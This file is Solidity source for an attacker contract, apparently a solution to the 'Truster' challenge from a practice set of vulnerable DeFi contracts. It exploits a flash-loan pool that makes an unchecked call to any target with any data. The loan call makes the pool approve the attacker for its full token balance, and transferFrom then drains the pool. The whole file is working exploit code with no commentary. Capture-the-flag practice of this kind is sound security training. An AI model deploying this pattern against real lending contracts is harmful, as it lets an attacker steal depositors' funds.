// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ILenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterAttacker is Ownable {
    address lenderPool;
    address token;

    constructor(address _lenderPool, address _token) {
        lenderPool = _lenderPool;
        token = _token;
    }

    function attack() external onlyOwner {
        ILenderPool lenderPoolContract = ILenderPool(lenderPool);
        IERC20 tokenContract = IERC20(token);
        
        lenderPoolContract.flashLoan(0, msg.sender, token, abi.encodeWithSignature("approve(address,uint256)", address(this), tokenContract.balanceOf(lenderPool)));
        tokenContract.transferFrom(lenderPool, msg.sender, tokenContract.balanceOf(lenderPool));
    }


}